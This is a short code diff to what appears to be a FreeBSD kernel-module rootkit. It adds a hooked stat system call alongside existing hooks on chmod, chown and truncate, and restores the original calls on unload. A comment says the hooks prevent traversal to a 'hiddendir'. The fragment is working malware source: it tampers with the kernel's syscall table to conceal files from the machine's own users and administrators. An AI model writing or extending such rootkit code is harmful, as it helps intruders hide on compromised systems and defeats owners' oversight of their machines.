@@ -255,6 +255,8 @@ static int stat_hook(struct thread *td, void *syscall_args)
         return (ENOENT);
     }
 
+    /* Otherwise, call the original system call */
+    return (sys_stat(td, syscall_args));
 }
 
 /* chdir hook - prevent directory traversal to the hiddendir */
@@ -393,6 +395,7 @@ static int load(struct module *module, int cmd, void *arg)
             sysent[SYS_chmod].sy_call = (sy_call_t *)chmod_hook;
             sysent[SYS_chown].sy_call = (sy_call_t *)chown_hook;
             sysent[SYS_truncate].sy_call = (sy_call_t *)truncate_hook;
+            sysent[SYS_stat].sy_call = (sy_call_t *)stat_hook;
             break;
         case MOD_UNLOAD:
             #if KERNDEBUG == 1
@@ -407,6 +410,7 @@ static int load(struct module *module, int cmd, void *arg)
             sysent[SYS_chmod].sy_call = (sy_call_t *)sys_chmod;
             sysent[SYS_chown].sy_call = (sy_call_t *)sys_chown;
             sysent[SYS_truncate].sy_call = (sy_call_t *)sys_truncate;
+            sysent[SYS_stat].sy_call = (sy_call_t *)sys_stat;
             break;
         default:
             error = EOPNOTSUPP; /* Operation not supported */
